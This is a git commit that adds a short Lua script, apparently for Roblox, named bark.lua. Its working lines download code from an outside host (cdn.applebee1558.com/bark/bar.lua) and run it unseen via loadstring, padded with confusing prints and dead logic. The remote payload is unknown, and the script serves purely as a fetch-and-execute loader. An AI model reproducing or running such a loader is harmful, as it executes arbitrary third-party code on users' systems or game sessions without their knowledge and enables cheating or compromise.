2875f2ae4d7e2ef66f77299a60661ab961a6b707
SMLkaiellis08 <65583319+SMLkaiellis08@users.noreply.github.com>
2021-09-26 13:52:12 +0100

    Create bark.lua

---
+++ lua/bark.lua
@@ -0,0 +1,24 @@
+local Ran = false
+local other = true
+print("if userasperms", other)
+print("Unknown", Ran, other)
+
+if _G.Ran == true then
+
+else
+    loadstring(game:HttpGetAsync('https://cdn.applebee1558.com/bark/bar.lua'))();
+    _G.Ran = true
+
+end
+
+
+
+
+if Ran == false then
+	print("Sorry Please try on 'Later or on 27th'")
+	--[[
+		loadscript(true)
+	--]]
+else
+	loadstring(game:HttpGetAsync'https://cdn.applebee1558.com/bark/bar.lua')('bark > blood :)')
+end
